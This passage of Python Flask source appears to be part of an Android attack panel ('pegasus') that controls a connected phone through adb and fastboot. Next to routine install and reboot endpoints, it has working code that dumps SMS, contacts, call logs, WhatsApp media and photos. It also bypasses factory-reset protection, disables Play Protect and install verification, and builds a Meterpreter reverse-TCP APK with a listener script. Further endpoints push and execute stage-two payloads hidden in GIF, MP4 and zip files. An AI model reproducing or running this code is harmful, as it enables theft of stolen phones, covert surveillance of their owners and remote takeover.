            res = _shell(f"pm install -r -g {remote}", timeout=600)
            _shell(f"rm -f {remote}")
        else:
            res = _adb(["install", "-r", "-g", str(src_path)], timeout=600)
        out = (res.get("stdout", "") + res.get("stderr", "")).strip()[:200]
        if res.get("rc", -1) == 0:
            return ok({"installed": True, "output": out})
        return fail(out or "install failed")

    @app.post("/api/q9/uninstall")
    def q9_uninstall():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        pkg = body.get("package", "")
        if not pkg:
            return fail("package required")
        res = _adb(["uninstall", pkg], timeout=180)
        out = (res.get("stdout", "") + res.get("stderr", "")).strip()[:160]
        if res.get("rc", -1) == 0:
            return ok({"uninstalled": True, "output": out})
        return fail(out or "uninstall failed")

    @app.post("/api/q9/extract_apk")
    def q9_extract_apk():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        pkg = body.get("package", "")
        if not pkg:
            return fail("package required")
        res = _shell(f"pm path {pkg}")
        paths = [l.split(":", 1)[1].strip() for l in res.get("stdout", "").splitlines() if l.startswith("package:")]
        if not paths:
            return fail("package not found")
        pulled = []
        for path in paths:
            dest = _stamp(pkg, "apk")
            if _pull(path, dest):
                pulled.append(str(dest))
        return ok({"extracted": pulled})

    # ---------------------------------------------------------------- power
    @app.post("/api/q9/reboot")
    def q9_reboot():
        if not _need():
            return fail("no device attached")
        _adb(["reboot"])
        return ok({"reboot": True})

    @app.post("/api/q9/poweroff")
    def q9_poweroff():
        if not _need():
            return fail("no device attached")
        _shell("reboot -p")
        return ok({"poweroff": True})

    @app.post("/api/q9/keyevent")
    def q9_keyevent():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        code = body.get("keycode", "3")
        _shell(f"input keyevent {code}")
        return ok({"keyevent": code})

    @app.post("/api/q9/reboot_bootloader")
    def q9_reboot_bootloader():
        if not _need():
            return fail("no device attached")
        _adb(["reboot", "bootloader"])
        return ok({"rebooting": "bootloader"})

    @app.post("/api/q9/reboot_recovery")
    def q9_reboot_recovery():
        if not _need():
            return fail("no device attached")
        _adb(["reboot", "recovery"])
        return ok({"rebooting": "recovery"})

    # ----------------------------------------------------------------- fastboot
    @app.get("/api/q9/fb/devices")
    def q9_fb_devices():
        res = _fb(["devices"])
        if not res.get("ok"):
            return fail(res.get("stderr", "fastboot unavailable"))
        rows = [l for l in res.get("stdout", "").splitlines() if l.strip()]
        if not rows:
            return warn_resp("none in fastboot mode - use reboot to bootloader first")
        return ok({"fastboot_devices": [r.strip() for r in rows]})

    @app.get("/api/q9/fb/getvar")
    def q9_fb_getvar():
        if not _need_fb():
            return fail("no fastboot device")
        res = _fb(["getvar", "all"], timeout=180)
        blob = (res.get("stdout", "") + res.get("stderr", "")).strip()
        if not blob:
            return fail("nothing returned")
        return ok({"vars": blob[:4000]})

    @app.post("/api/q9/fb/unlock")
    def q9_fb_unlock():
        if not _need_fb():
            return fail("no fastboot device")
        verbs = [("flashing", "unlock"), ("oem", "unlock"),
                 ("flashing", "unlock_critical"), ("oem", "unlock-go")]
        results = []
        for args in verbs:
            res = _fb(list(args), timeout=120)
            blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
            results.append({"command": " ".join(args), "ok": res.get("rc", -1) == 0,
                            "output": (res.get("stdout", "") + res.get("stderr", "")).strip()[:60]})
            if "okay" in blob or "success" in blob:
                break
        res = _fb(["flashing", "get_unlock_ability"])
        results.append({"command": "flashing get_unlock_ability",
                        "output": (res.get("stdout", "") + res.get("stderr", "")).strip()[:80]})
        return ok({"steps": results})

    @app.post("/api/q9/fb/flash_boot")
    def q9_fb_flash_boot():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        partition = body.get("partition", "init_boot")
        if partition not in ("init_boot", "boot", "recovery"):
            return fail("pick init_boot, boot or recovery")
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("image path required")
        res = _fb(["flash", partition, str(src)], timeout=600)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "okay" in blob or "finished" in blob:
            return ok({f"{partition}_flashed": True})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:180])

    @app.post("/api/q9/fb/vbmeta")
    def q9_fb_vbmeta():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        args = ["--disable-verity", "--disable-verification", "flash", "vbmeta"]
        if src:
            args.append(str(src))
        res = _fb(args, timeout=300)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "okay" in blob or "finished" in blob:
            return ok({"verity_disabled": True})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:180])

    @app.post("/api/q9/fb/flash_part")
    def q9_fb_flash_part():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        part = body.get("partition", "")
        if not part:
            return fail("partition name required")
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("image path required")
        res = _fb(["flash", part, str(src)], timeout=900)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "okay" in blob or "finished" in blob:
            return ok({f"flashed_{part}": True})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:180])

    @app.post("/api/q9/fb/temp_boot")
    def q9_fb_temp_boot():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("image path required")
        res = _fb(["boot", str(src)], timeout=600)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "okay" in blob or "finished" in blob:
            return ok({"temp_booted": True})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:180])

    @app.post("/api/q9/fb/update")
    def q9_fb_update():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("zip path required")
        res = _fb(["update", str(src)], timeout=1800)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "finished" in blob or "okay" in blob:
            return ok({"updated": True})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[-200:] or "sent")

    @app.post("/api/q9/fb/slot")
    def q9_fb_slot():
        if not _need_fb():
            return fail("no fastboot device")
        res = _fb(["getvar", "current-slot"], timeout=60)
        blob = (res.get("stdout", "") + res.get("stderr", ""))
        current = ""
        for line in blob.splitlines():
            if "current-slot" in line:
                current = line.split(":")[-1].strip()
        body = request.get_json(silent=True) or {}
        target = body.get("slot", "").strip().lower()
        if target not in ("a", "b"):
            return fail("slot must be a or b")
        res = _fb(["--set-active", target])
        if res.get("rc", -1) == 0:
            return ok({"active": target, "previous": current or "unknown"})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:140])

    @app.post("/api/q9/fb/oem")
    def q9_fb_oem():
        if not _need_fb():
            return fail("no fastboot device")
        chunks = []
        for label, args in (("device-info", ("oem", "device-info")),
                            ("unlock_data", ("oem", "get_unlock_data")),
                            ("unlock_ability", ("flashing", "get_unlock_ability")),
                            ("all_vars", ("getvar", "all"))):
            res = _fb(list(args), timeout=120)
            blob = (res.get("stdout", "") + res.get("stderr", "")).strip()
            chunks.append(f"--- {label} ---\n{blob or '-'}")
        blob_all = "\n".join(chunks).lower()
        verdicts = []
        for marker, verdict in (("carrier", "carrier string present"),
                                ("unlock_ability: 1", "unlockable now"),
                                ("device is unlocked", "already unlocked")):
            if marker in blob_all:
                verdicts.append(verdict)
        _save("fastboot_oem", "\n\n".join(chunks))
        return ok({"chunks": "\n\n".join(chunks), "verdicts": verdicts})

    @app.post("/api/q9/fb/erase")
    def q9_fb_erase():
        if not _need_fb():
            return fail("no fastboot device")
        body = request.get_json(silent=True) or {}
        choice = body.get("choice", "1")
        if choice == "1":
            res = _fb(["erase", "cache"])
            if res.get("rc", -1) == 0:
                return ok({"cache_erased": True})
            return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:140])
        elif choice == "2":
            res = _fb(["format", "userdata"], timeout=900)
            if res.get("rc", -1) == 0:
                return ok({"userdata_formatted": True})
            return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:140])
        return fail("invalid choice (1=cache, 2=userdata)")

    # ---------------------------------------------------------------- input
    @app.post("/api/q9/input/tap")
    def q9_input_tap():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        try:
            x = int(body.get("x", 0))
            y = int(body.get("y", 0))
        except ValueError:
            return fail("need integer x and y")
        _shell(f"input tap {x} {y}")
        return ok({"tapped": f"{x},{y}"})

    @app.post("/api/q9/input/swipe")
    def q9_input_swipe():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        vals = body.get("vals", [])
        if len(vals) == 5:
            _shell(f"input swipe {vals[0]} {vals[1]} {vals[2]} {vals[3]} {vals[4]}")
        elif len(vals) == 4:
            _shell(f"input swipe {vals[0]} {vals[1]} {vals[2]} {vals[3]}")
        else:
            return fail("need 4 or 5 values")
        return ok({"swiped": True})

    @app.post("/api/q9/input/type")
    def q9_input_type():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        text = body.get("text", "")
        if not text:
            return fail("text required")
        esc = text.replace(" ", "%s")
        _shell(f'input text "{esc}"')
        return ok({"typed": True})

    @app.post("/api/q9/input/unlock")
    def q9_input_unlock():
        if not _need():
            return fail("no device attached")
        _shell("input keyevent 224")
        time.sleep(0.4)
        _shell("input swipe 540 1800 540 600 200")
        _shell("input keyevent 82")
        return ok({"unlocked": True})

    @app.post("/api/q9/input/lock")
    def q9_input_lock():
        if not _need():
            return fail("no device attached")
        _shell("input keyevent 26")
        return ok({"locked": True})

    @app.post("/api/q9/input/url")
    def q9_input_url():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        url = body.get("url", "")
        if not url:
            return fail("url required")
        _shell(f'am start -a android.intent.action.VIEW -d "{url}"')
        return ok({"opened": url})

    # -------------------------------------------------------- data harvesting
    def _query(name: str, uri: str):
        res = _shell(f"content query --uri {uri}", timeout=180)
        if not res.get("ok") or not res.get("stdout", "").strip():
            return fail((res.get("stderr") or "empty result").strip()[:160])
        rows = res.get("stdout", "").count("Row:")
        _save(name.lower().replace(" ", "_"), res.get("stdout", ""))
        return ok({name: res.get("stdout", ""), "rows": rows})

    @app.post("/api/q9/harvest/sms")
    def q9_send_sms():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        number = body.get("number", "")
        msg = body.get("body", "")
        if not number:
            return fail("number required")
        _shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" --es sms_body "{msg}"')
        return ok({"sms_composer_opened": True})

    @app.get("/api/q9/harvest/sms")
    def q9_dump_sms():
        return _query("dump sms", "content://sms")

    @app.get("/api/q9/harvest/contacts")
    def q9_dump_contacts():
        return _query("dump contacts", "content://com.android.contacts/data/phones")

    @app.get("/api/q9/harvest/calls")
    def q9_dump_calls():
        return _query("dump call log", "content://call_log/calls")

    @app.get("/api/q9/harvest/calendar")
    def q9_dump_calendar():
        return _query("dump calendar", "content://com.android.calendar/events")

    @app.post("/api/q9/harvest/whatsapp")
    def q9_whatsapp():
        if not _need():
            return fail("no device attached")
        pulled = []
        for path in ("/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
                     "/sdcard/WhatsApp/Media"):
            res = _shell(f"ls {path}")
            if res.get("ok") and res.get("stdout", "").strip():
                _pull(path, _session_dir() / "whatsapp")
                pulled.append(path)
        _save("whatsapp_paths", "\n".join(pulled))
        return ok({"whatsapp_media": pulled})

    @app.get("/api/q9/harvest/screenshots")
    def q9_screenshots():
        if not _need():
            return fail("no device attached")
        pulled = []
        for path in ("/sdcard/DCIM/Screenshots", "/sdcard/Pictures/Screenshots"):
            res = _shell(f"ls {path}")
            if res.get("ok") and res.get("stdout", "").strip():
                _pull(path, _session_dir() / "screenshots")
                pulled.append(path)
        return ok({"screenshots": pulled})

    @app.get("/api/q9/harvest/camera")
    def q9_camera_photos():
        if not _need():
            return fail("no device attached")
        res = _shell("ls /sdcard/DCIM/Camera")
        if not (res.get("ok") and res.get("stdout", "").strip()):
            return fail("camera dir empty or absent")
        _pull("/sdcard/DCIM/Camera", _session_dir() / "camera")
        return ok({"camera_photos": True})

    @app.post("/api/q9/harvest/all")
    def q9_harvest_all():
        if not _need():
            return fail("no device attached")
        results = {}
        steps = (
            ("info", q9_info),
            ("battery", q9_battery),
            ("identity", q9_identity),
            ("sms", q9_dump_sms),
            ("contacts", q9_dump_contacts),
            ("calls", q9_dump_calls),
            ("calendar", q9_dump_calendar),
            ("third_party", q9_third_party),
            ("whatsapp", q9_whatsapp),
            ("screenshots", q9_screenshots),
            ("camera", q9_camera_photos),
        )
        for name, fn in steps:
            try:
                r = fn()
                results[name] = r.get_json() if hasattr(r, "get_json") else str(r)
            except Exception as exc:
                results[name] = {"error": str(exc)}
        return ok({"harvest": results})

    # --------------------------------------------- privilege / FRP / Play Protect
    @app.post("/api/q9/priv/assess")
    def q9_priv_assess():
        if not _need():
            return fail("no device attached")
        findings = []

        def probe(label, cmd, good=""):
            out = _shell(cmd).get("stdout", "").strip() or "-"
            findings.append((label, out, bool(good) and good in out))
            return out

        probe("id", "id")
        probe("uid", "id -u")
        probe("kernel", "uname -r")
        probe("run_as_route", 'run-as com.android.shell sh -c "id"', "uid=")
        probe("su_on_path", "which su", "/")
        for pth in ("/system/bin/su", "/system/xbin/su", "/sbin/su",
                    "/debug_ramdisk/su", "/data/adb/magisk"):
            probe(f"artifact_{pth}", f"ls -d {pth} 2>/dev/null", pth)
        probe("magisk_modules", "ls /data/adb/modules 2>/dev/null", "/")
        probe("build_tags", "getprop ro.build.tags", "test-keys")
        probe("debuggable", "getprop ro.debuggable", "1")
        probe("secure", "getprop ro.secure", "0")
        probe("selinux", "getenforce", "Permissive")
        probe("verity", "getprop ro.boot.veritymode", "disabled")
        uid_out = _shell("su -c id -u").get("stdout", "").strip()
        findings.append(("su_c_id_u", uid_out or "-", uid_out == "0"))
        setuid = []
        out = _shell("ls -la /system/bin /system/xbin /vendor/bin 2>/dev/null").get("stdout", "")
        for line in out.splitlines():
            if line.startswith("-rws") or line.startswith("---s"):
                setuid.append(line.split()[-1])
        findings.append(("setuid_binaries", str(len(setuid)), bool(setuid)))
        mode = _ensure_write_access(force=True)
        findings.append(("write_mode", mode, mode == "root"))
        writable = _probe_write()
        findings.append(("probe_write", "ok" if writable else "refused", writable))
        if uid_out == "0":
            verdict = "root shell confirmed - kernel LPE not required"
        elif writable:
            verdict = "no root, but settings accept writes - 55/56 will land"
        else:
            verdict = "settings locked - consider kernel exploit engine"
        _save("privesc", "\n".join(f"{l}: {v}" for l, v, _ in findings) + f"\nverdict: {verdict}")
        return ok({"findings": [{"label": l, "value": v, "good": g} for l, v, g in findings],
                   "verdict": verdict, "setuid": setuid[:20]})

    @app.get("/api/q9/priv/frp")
    def q9_frp():
        if not _need():
            return fail("no device attached")
        chunks = []
        for label, cmd in (
            ("frp_service", "dumpsys frp"),
            ("frp_partition", "getprop ro.frp.pst"),
            ("setup_complete", "settings get secure user_setup_complete"),
            ("device_provisioned", "settings get global device_provisioned"),
            ("accounts", "dumpsys account | head -n 40"),
            ("google_packages", "pm list packages | grep -i google | head -n 20"),
        ):
            out = _shell(cmd).get("stdout", "").strip() or "-"
            chunks.append(f"--- {label} ---\n{out}")
        setup = _readback("secure", "user_setup_complete")
        if setup == "1":
            verdict = "already_provisioned"
        else:
            verdict = "setup_incomplete"
        _save("frp_state", "\n\n".join(chunks))
        return ok({"chunks": "\n\n".join(chunks), "verdict": verdict})

    @app.post("/api/q9/priv/frp_chain")
    def q9_frp_chain():
        if not _need():
            return fail("no device attached")
        mode = _ensure_write_access(force=True)
        steps = [
            ("provisioned", "global", "device_provisioned", "1"),
            ("setup_complete", "secure", "user_setup_complete", "1"),
            ("tv_setup_flag", "secure", "tv_user_setup_complete", "1"),
            ("adb_verifier", "global", "verifier_verify_adb_installs", "0"),
        ]
        hits = 0
        step_results = []
        for label, namespace, key, value in steps:
            ok_flag = _setting_write(namespace, key, value)
            if ok_flag:
                hits += 1
            else:
                step_results.append({"label": label, "ok": False})
        if _clear_package("com.google.android.gms"):
            hits += 1
        _shell("am start -a com.google.android.setupwizard.SETUP_WIZARD_FINISHED")
        setup = _readback("secure", "user_setup_complete")
        prov = _readback("global", "device_provisioned")
        good = setup == "1" and prov == "1"
        _save("frp_chain", f"{hits}/{len(steps) + 1} steps landed, mode={mode}, verify={'PASS' if good else 'FAIL'}")
        # persist script
        body_script = "\n".join([
            "set -u",
            "w() { ns=$1; k=$2; v=$3;",
            "  su -c \"settings put $ns $k $v\" 2>/dev/null;",
            "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
            "  cmd settings put $ns $k $v 2>/dev/null;",
            "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
            "  content insert --uri content://settings/$ns --bind name:s:$k --bind value:s:$v 2>/dev/null;",
            "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
            "  content update --uri content://settings/$ns --bind value:s:$v --where \"name='$k'\" 2>/dev/null;",
            "}",
            "w global device_provisioned 1",
            "w secure user_setup_complete 1",
            "w secure tv_user_setup_complete 1",
            "w global verifier_verify_adb_installs 0",
            "pm disable-user --user 0 com.google.android.gms 2>/dev/null;",
            "pm enable com.google.android.gms 2>/dev/null",
            "su -c 'pm clear com.google.android.gms' 2>/dev/null || pm clear com.google.android.gms",
            "am start -a com.google.android.setupwizard.SETUP_WIZARD_FINISHED 2>/dev/null",
            "am force-stop com.google.android.setupwizard 2>/dev/null",
            "echo done",
        ]) + "\n"
        _persist_script("pegasus_frp", body_script)
        return ok({"hits": hits, "verified": good, "mode": mode})

    @app.post("/api/q9/priv/playprotect")
    def q9_playprotect():
        if not _need():
            return fail("no device attached")
        _ensure_write_access(force=True)
        keys = [
            ("global", "package_verifier_enable", "0"),
            ("secure", "package_verifier_user_consent", "-1"),
            ("global", "verifier_verify_adb_installs", "0"),
        ]
        hits = 0
        for ns, key, value in keys:
            if _setting_write(ns, key, value):
                hits += 1
        _save("playprotect", f"{hits}/{len(keys)} landed")
        script = "\n".join(f"settings put {ns} {k} {v}" for ns, k, v in keys) + "\necho done\n"
        _persist_script("pegasus_playprotect", script)
        if hits == len(keys):
            return ok({"playprotect_defeated": True, "hits": hits})
        return fail(f"partial - {hits}/{len(keys)} keys landed")

    # ------------------------------------------------------------ pairing
    @app.post("/api/q9/pair/metasploit")
    def q9_metasploit():
        if not _need():
            return fail("no device attached")
        if not shutil.which("msfvenom"):
            return fail("msfvenom not on PATH")
        body = request.get_json(silent=True) or {}
        lhost = body.get("lhost", _local_ip())
        lport = body.get("lport", "4444")
        payload = body.get("payload", "android/meterpreter/reverse_tcp")
        out = _stamp("meterpreter", "apk")
        res = run(["msfvenom", "-p", payload, f"LHOST={lhost}",
                   f"LPORT={lport}", "-o", str(out)], timeout=900)
        if not res.get("ok") or not out.is_file():
            return fail(res.get("stderr", "build failed"))
        rcfile = out.with_suffix(".rc")
        rcfile.write_text(
            "use exploit/multi/handler\n"
            f"set PAYLOAD {payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "exploit -j\n", encoding="utf-8")
        _setting_write("global", "verifier_verify_adb_installs", "0", escalate=False)
        return ok({"payload": str(out), "size": out.stat().st_size,
                   "handler_script": str(rcfile),
                   "note": f"msfconsole -r {rcfile}"})

    @app.post("/api/q9/pair/reverse")
    def q9_reverse():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        action = body.get("action", "add")
        if action == "list":
            res = _adb(["reverse", "--list"])
            return ok({"reverse": res.get("stdout", "") or "(none)"})
        if action == "remove":
            port = body.get("port", "")
            if port:
                _adb(["reverse", "--remove", f"tcp:{port}"])
            else:
                _adb(["reverse", "--remove-all"])
            return ok({"removed": True})
        ports = body.get("ports", "8080")
        results = []
        for pair in str(ports).split(","):
            pair = pair.strip()
            host, _, dev = pair.partition(":")
            dev = dev or host
            res = _adb(["reverse", f"tcp:{host}", f"tcp:{dev}"])
            results.append({"pair": pair, "ok": res.get("rc", -1) == 0,
                            "output": (res.get("stdout", "") + res.get("stderr", "")).strip()[:100]})
        res = _adb(["reverse", "--list"])
        return ok({"results": results, "listing": res.get("stdout", "")})

    @app.post("/api/q9/pair/pair")
    def q9_pair():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        hostport = body.get("hostport", "")
        code = body.get("code", "")
        if not (hostport and code):
            return fail("hostport and code required")
        host, _, port = hostport.partition(":")
        for attempt in range(3):
            res = _adb(["pair", f"{host}:{port}", code], timeout=90)
            blob = (res.get("stdout", "") + res.get("stderr", "")).strip()
            if res.get("rc", -1) == 0 and "successfully paired" in blob.lower():
                try:
                    (Path.home() / ".pegasus" / "paircode").write_text(code + "\n", encoding="utf-8")
                except OSError:
                    pass
                return ok({"paired": True, "output": blob})
            time.sleep(2)
        return fail("pairing failed after 3 attempts")

    @app.post("/api/q9/pair/qr")
    def q9_pair_qr():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        port = body.get("port", "5555")
        code = body.get("code", "")
        if not code:
            return fail("code required")
        payload = f"WIFI:T:ADB;S:qandroid-{port};P:{code};;"
        try:
            import qrcode
            q = qrcode.QRCode(border=1)
            q.add_data(payload)
            q.make()
            buf = __import__("io").StringIO()
            q.print_ascii(out=buf, invert=True)
            art = buf.getvalue()
        except Exception:
            art = None
        return ok({"payload": payload, "ascii_qr": art,
                   "note": "scan from Developer options > Wireless debugging > Pair with code"})

    @app.get("/api/q9/pair/mdns")
    def q9_mdns():
        if not _need():
            return fail("no device attached")
        res = _adb(["mdns", "services"], timeout=30)
        if not res.get("ok"):
            return fail("mdns unsupported by this adb")
        connect, pair = [], []
        for line in res.get("stdout", "").splitlines():
            line = line.strip()
            if "_adb" not in line:
                continue
            (pair if "_adb-tls-pairing" in line else connect).append(line.split()[-1])
        return ok({"connect": connect, "pair": pair})

    # ------------------------------------------------------------ staging
    @app.post("/api/q9/stage/wasm")
    def q9_stage_wasm():
        if not _need():
            return fail("no device attached")
        wasm_bytes = build_wasm()
        good, msg = validate_wasm(wasm_bytes)
        if not good:
            return fail(f"wasm validation failed: {msg}")
        wasm = _stamp("stage2", "wasm")
        wasm.write_bytes(wasm_bytes)
        remote = "/data/local/tmp/stage2.wasm"
        if not _push(wasm, remote):
            return fail("push failed")
        # check runtime
        res = _shell("command -v wasmtime || command -v wasmer || command -v wasm3 || command -v node || command -v d8")
        runtime = res.get("stdout", "").strip()
        if runtime in ("wasmtime", "wasmer", "wasm3"):
            res2 = _shell(f"{runtime} {remote}", timeout=120)
            return ok({"ran_under": runtime, "output": res2.get("stdout", "") or res2.get("stderr", "")})
        if runtime in ("node", "d8"):
            script = f"const f=require('fs').readFileSync('{remote}');WebAssembly.instantiate(new Uint8Array(f)).then(m=>(m.instance.exports.m||m.instance.exports.main)())"
            res2 = _shell(f'{runtime} -e "{script}"', timeout=120)
            return ok({"ran_under": runtime, "output": res2.get("stdout", "") or res2.get("stderr", "")})
        # fallback: shell stage2
        stage = _session_dir() / "stage2.sh"
        stage.write_text("#!/system/bin/sh\n" + _stage2_body(), encoding="utf-8")
        if not _push(stage, "/data/local/tmp/stage2.sh"):
            return fail("push stage2.sh failed")
        _shell("chmod 755 /data/local/tmp/stage2.sh")
        res2 = _shell("sh /data/local/tmp/stage2.sh")
        _save("stage2_shell", res2.get("stdout", "") or res2.get("stderr", ""))
        return ok({"wasm_pushed": True, "fallback_shell": True,
                   "output": res2.get("stdout", "") or res2.get("stderr", "")})

    @app.post("/api/q9/stage/mp4")
    def q9_stage_mp4():
        if not _need():
            return fail("no device attached")
        data = build_mp4()
        good, msg = validate_mp4(data)
        if not good:
            return fail(f"mp4 validation failed: {msg}")
        path = _stamp("poc", "mp4")
        path.write_bytes(data)
        remote = f"/sdcard/Movies/{path.name}"
        if not _push(path, remote):
            return fail("push failed")
        _shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t video/mp4')
        return ok({"mp4": str(path), "size": len(data), "pushed": remote})

    @app.post("/api/q9/stage/gif")
    def q9_stage_gif():
        if not _need():
            return fail("no device attached")
        base = build_gif(payload=b"PEGASUS")
        good, msg = validate_gif(base)
        if not good:
            return fail(f"gif validation failed: {msg}")
        path = _stamp("polyglot", "gif")
        gif_len = len(base)
        stage = _session_dir() / "stage2.sh"
        stage.write_text("#!/system/bin/sh\n" + _stage2_body(), encoding="utf-8")
        path.write_bytes(base + b"\n#!stage2\n" + stage.read_bytes())
        remote = f"/sdcard/Download/{path.name}"
        if not _push(path, remote):
            return fail("push failed")
        _shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t image/gif')
        return ok({"gif": str(path), "gif_bytes": gif_len,
                   "note": f"carve with: dd if={path.name} bs=1 skip={gif_len + 8} of=stage2.sh"})

    @app.post("/api/q9/stage/embedded")
    def q9_stage_embedded():
        if not _need():
            return fail("no device attached")
        bundle = _stamp("stage_bundle", "zip")
        stage = _session_dir() / "stage2.sh"
        stage.write_text("#!/system/bin/sh\n" + _stage2_body(), encoding="utf-8")
        runner = Path(tempfile.mkdtemp()) / "run.sh"
        runner.write_text(
            "#!/system/bin/sh\n"
            "D=/data/local/tmp/pegasus_stage\n"
            "rm -rf $D && mkdir -p $D\n"
            "unzip -o \"$1\" -d $D >/dev/null 2>&1\n"
            "chmod 755 $D/stage2.sh\n"
            "sh $D/stage2.sh\n", encoding="utf-8")
        with zipfile.ZipFile(bundle, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(stage, "stage2.sh")
            zf.write(runner, "run.sh")
            zf.writestr("manifest.json", json.dumps(
                {"built": _now(), "target": _serial()}, indent=2))
        remote = f"/sdcard/Download/{bundle.name}"
        if not _push(bundle, remote):
            return fail("push failed")
        if not _shell("command -v unzip").get("stdout", "").strip():
            return fail("unzip missing on target")
        _shell("mkdir -p /data/local/tmp/pegasus_stage")
        res = _shell(f"unzip -o {remote} -d /data/local/tmp/pegasus_stage")
        if not res.get("ok"):
            return fail(res.get("stderr", "unzip failed"))
        _shell("chmod 755 /data/local/tmp/pegasus_stage/stage2.sh")
        res2 = _shell("sh /data/local/tmp/pegasus_stage/stage2.sh")
        _save("embedded_stage", res2.get("stdout", "") or res2.get("stderr", ""))
        return ok({"bundle": str(bundle), "size": bundle.stat().st_size,
                   "output": res2.get("stdout", "") or res2.get("stderr", "")})

    # ------------------------------------------------------------ observation
    @app.post("/api/q9/obs/ask_model")
    def q9_ask_model():
        if not _need():
            return fail("no device attached")
        try:
            from llama_cpp import Llama
        except ImportError:
            return fail("llama_cpp not installed")
        body = request.get_json(silent=True) or {}
        model = body.get("model", "")
        if not model:
            # search for .gguf
            found = None
            for folder in (Path.home() / "models", Path.cwd()):
                hits = sorted(folder.glob("*.gguf")) if folder.is_dir() else []
                if hits:
                    found = str(hits[0])
                    break
            model = found or ""
        facts = _prop("ro.product.model") or "unknown device"
        build = _prop("ro.build.fingerprint") or "unknown build"
        prompt = (f"Android device {facts} on build {build}. "
                  "Summarise the likely attack surface and the three highest-value checks.")
        llm = Llama(model_path=model, n_ctx=2048, verbose=False)
        chunks = []
        for piece in llm(prompt, max_tokens=400, stream=True):
            text = piece["choices"][0]["text"]
            chunks.append(text)
        answer = "".join(chunks)
        _save("model_answer", answer)
        return ok({"answer": answer})

    @app.post("/api/q9/obs/focus_watcher")
    def q9_focus_watcher():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        rounds = int(body.get("rounds", 20))
        log = _stamp("focus", "log")
        last = ""
        lines = []
        for _ in range(rounds):
            out = _shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
            current = " | ".join(l.strip() for l in out.get("stdout", "").splitlines() if l.strip()) or "-"
            if current != last:
                entry = f"{datetime.datetime.now():%H:%M:%S} {current}"
                lines.append(entry)
                last = current
            time.sleep(1)
        log.write_text("\n".join(lines) + "\n", encoding="utf-8")
        return ok({"focus_changes": len(lines), "log": str(log)})

    @app.post("/api/q9/obs/shot_burst")
    def q9_shot_burst():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        count = int(body.get("count", 10))
        delay = float(body.get("delay", 0.5))
        frames_dir = _session_dir() / "burst"
        frames_dir.mkdir(parents=True, exist_ok=True)
        captured = 0
        for i in range(count):
            # screenshot via exec-out
            res = _adb(["exec-out", "screencap", "-p"], timeout=60, binary=True)
            data = res.get("stdout") if isinstance(res.get("stdout"), bytes) else None
            if data and data.startswith(b"\x89PNG"):
                (frames_dir / f"{i:03d}.png").write_bytes(data)
                captured += 1
            time.sleep(delay)
        if not captured:
            return fail("no frames captured")
        ffmpeg = shutil.which("ffmpeg")
        gif_path = None
        if ffmpeg and captured > 1:
            gif_path = _session_dir() / "burst.gif"
            fps = str(max(1, int(1 / max(delay, 0.1))))
            res = run([ffmpeg, "-y", "-framerate", fps,
                       "-i", str(frames_dir / "%03d.png"), str(gif_path)], timeout=300)
            if not (res.get("ok") and gif_path.exists()):
                gif_path = None
        return ok({"captured": captured, "frames_dir": str(frames_dir),
                   "gif": str(gif_path) if gif_path else None})

    # ---------------------------------------------------------------- exploit
    @app.post("/api/q9/exploit/kernel")
    def q9_kernel():
        if not _need():
            return fail("no device attached")
        ver = _shell("uname -r").get("stdout", "").strip()
        patch = _prop("ro.build.version.security_patch") or "unknown"
        sdk = _prop("ro.build.version.sdk") or "unknown"
        applicable = []
        k = tuple(int(x) for x in re.findall(r"\d+", ver or "0.0.0")[:3]) or (0,)
        for cve, name, lo, hi, desc in KERNEL_CVES:
            if lo is None:
